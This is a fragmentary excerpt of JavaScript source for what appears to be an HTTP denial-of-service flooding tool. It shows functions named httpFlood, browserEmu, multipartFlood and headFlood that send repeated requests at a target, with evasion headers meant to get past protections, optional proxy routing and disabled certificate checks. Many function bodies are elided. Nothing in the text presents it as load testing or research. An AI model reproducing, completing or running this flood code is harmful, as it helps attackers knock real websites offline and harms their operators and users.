...
function httpFlood(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            const opts = { agent, hostname: t.hostname, port: t.port, path, method, headers, timeout: 5000, rejectUnauthorized: false };
...
function browserEmu(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path, method: 'GET', headers, timeout: 5000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
...
function multipartFlood(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path: t.path, method: 'POST', headers, timeout: 5000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
...
function headFlood(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            const headers = generateEvasionHeaders(target);
            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path, method: 'HEAD', headers, timeout: 3000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('end', () => setImmediate(fire));
